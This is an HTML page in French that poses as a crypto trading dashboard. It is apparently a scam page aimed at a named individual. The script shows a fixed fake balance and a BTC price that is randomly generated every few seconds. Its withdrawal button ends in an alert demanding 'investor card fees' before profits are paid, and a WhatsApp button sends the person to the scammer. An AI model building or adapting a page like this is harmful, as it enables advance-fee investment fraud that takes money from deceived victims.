<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Trading Investissement - Interface Mise à Jour</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap">
    <style>
        /* Global styling */
        body {
            font-family: 'Roboto', sans-serif;
            margin: 0;
            padding: 0;
            background-color: #0a0a0a;
            color: #ffffff;
        }

        header {
            background-color: #121212;
            padding: 20px 40px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        header .logo h1 {
            color: #f0b90b;
            font-size: 28px;
            font-weight: bold;
        }

        nav ul {
            display: flex;
            list-style: none;
        }

        nav ul li {
            margin-right: 30px;
        }

        nav ul li a {
            color: white;
            text-decoration: none;
            font-size: 16px;
        }

        .actions {
            display: flex;
            align-items: center;
        }

        .balance {
            color: #f0b90b;
            font-weight: bold;
            margin-right: 40px;
        }

        button {
            background-color: #f0b90b;
            border: none;
            padding: 12px 24px;
            font-weight: bold;
            cursor: pointer;
            border-radius: 5px;
            margin-right: 10px;
            font-size: 14px;
            transition: background-color 0.3s;
        }

        button:hover {
            background-color: #e0a707;
        }

        main {
            padding: 40px 20px;
            max-width: 1200px;
            margin: 0 auto;
        }

        .trading-interface {
            display: flex;
            flex-direction: column;
            align-items: center;
            width: 100%;
        }

        .price-info {
            background-color: #1c1c1c;
            padding: 20px 30px;
            margin-bottom: 20px;
            display: flex;
            justify-content: space-between;
            width: 100%;
            color: #58a6ff;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.5);
        }

        .price-info h2 {
            font-size: 24px;
            margin: 0;
        }

        .price {
            font-size: 32px;
            font-weight: bold;
        }

        #chart_container {
            height: 500px;
            background-color: #1c1c1c;
            margin-bottom: 30px;
            border-radius: 10px;
            width: 100%;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.5);
        }

        .order-book {
            background-color: #1c1c1c;
            padding: 20px;
            border-radius: 10px;
            width: 100%;
            margin-bottom: 30px;
        }

        .orders .order {
            display: flex;
            justify-content: space-between;
            padding: 15px 0;
            border-bottom: 1px solid #303030;
        }

        .actions-container {
            display: flex;
            justify-content: space-between;
            width: 100%;
        }

        .actions-container button {
            width: 48%;
            padding: 20px;
        }

        .withdrawal-form {
            display: none;
            flex-direction: column;
            background-color: #1c1c1c;
            padding: 20px;
            border-radius: 10px;
            margin-top: 20px;
            width: 100%;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.5);
        }

        footer {
            text-align: center;
            padding: 20px;
            background-color: #121212;
            margin-top: 40px;
        }

        @media (max-width: 768px) {
            .actions-container {
                flex-direction: column;
            }

            .actions-container button {
                width: 100%;
                margin-bottom: 10px;
            }
        }
    </style>
</head>
<body>
    <header>
        <div class="logo">
            <h1>Trading Investissement</h1>
        </div>
        <nav>
            <div class="actions">
                <span class="balance">Solde: 5 500 000 FCFA</span>
                <button id="whatsapp-button"><i class="fab fa-whatsapp"></i> WhatsApp</button>
                <button id="logout-button">Déconnexion</button>
            </div>
        </nav>
    </header>

    <main>
        <div class="trading-interface">
            <div class="price-info">
                <h2>Prix Actuel BTC/USDT</h2>
                <span class="price">66,000.00</span>
                <span class="variation">+0.5%</span>
            </div>
            <div id="chart_container">
                <div id="tradingview_chart"></div>
            </div>
            <div class="order-book">
                <h3>Carnet d'ordres</h3>
                <div class="orders">
                    <div class="order">
                        <span class="price">66,000.00</span>
                        <span class="quantity">1.5 BTC</span>
                        <span class="total">99,000.00 USDT</span>
                    </div>
                </div>
            </div>
            <div class="actions-container">
                <button id="orange-money">Retirer via T-Money</button>
                <button id="paypal">Retirer via PayPal</button>
            </div>
            <div class="withdrawal-form" id="withdrawal-form">
                <h3>Confirmer le retrait</h3>
                <div class="form-info" id="withdrawal-info"></div>
                <button id="confirm-withdrawal">Valider le Retrait</button>
            </div>
        </div>
    </main>

    <footer>
        <p>© 2024 Africa Investissement. Tous droits réservés.</p>
    </footer>

    <script src="https://s3.tradingview.com/tv.js"></script>
    <script>
        document.addEventListener("DOMContentLoaded", () => {
            const priceElement = document.querySelector('.price-info .price');
            const variationElement = document.querySelector('.price-info .variation');
            const withdrawalForm = document.getElementById('withdrawal-form');
            const withdrawalInfo = document.getElementById('withdrawal-info');

            const updatePrice = () => {
                const newPrice = (Math.random() * (70000 - 65000) + 65000).toFixed(2);
                const newVariation = (Math.random() * (2) - 1).toFixed(2);
                priceElement.textContent = newPrice;
                variationElement.textContent = `${newVariation}%`;
            };

            setInterval(updatePrice, 5000);

            const setWithdrawalInfo = (method) => {
                const accountName = "ADOM AKLESSO";
                const accountNumber = "228 90 29 86 29";
                const balance = "5 500 000 FCFA";
                withdrawalInfo.innerHTML = `${accountName}<br>${accountNumber}<br>${balance}<br>via ${method}`;
                withdrawalForm.style.display = 'flex';
            };

            document.getElementById('orange-money').addEventListener('click', () => {
                const confirmWithdrawal = confirm("Voulez-vous vraiment retirer via T-Money ?");
                if (confirmWithdrawal) {
                    setWithdrawalInfo("T-Money");
                }
            });

            document.getElementById('paypal').addEventListener('click', () => {
                const confirmWithdrawal = confirm("Voulez-vous vraiment retirer via PayPal ?");
                if (confirmWithdrawal) {
                    alert("Vous n'avez pas de compte PayPal lié.");
                }
            });

            document.getElementById('confirm-withdrawal').addEventListener('click', () => {
                alert('Cher ADOM, veuillez payer les frais de carte d\'investisseur afin de recevoir vos bénéfices dans les 5 minutes.');
                withdrawalForm.style.display = 'none';
            });

            document.getElementById('whatsapp-button').addEventListener('click', () => {
                window.location.href = "https://wa.me/16263231795";
            });

            document.getElementById('logout-button').addEventListener('click', () => {
                alert("Déconnexion réussie.");
                window.location.reload();
            });

            new TradingView.widget({
                container_id: "tradingview_chart",
                autosize: true,
                symbol: "BINANCE:BTCUSDT",
                interval: "D",
                timezone: "Etc/UTC",
                theme: "dark",
                style: "1",
                locale: "fr",
                toolbar_bg: "#f1f3f6",
                enable_publishing: false,
                allow_symbol_change: true,
                hideideas: true
            });
        });
    </script>
</body>
</html>
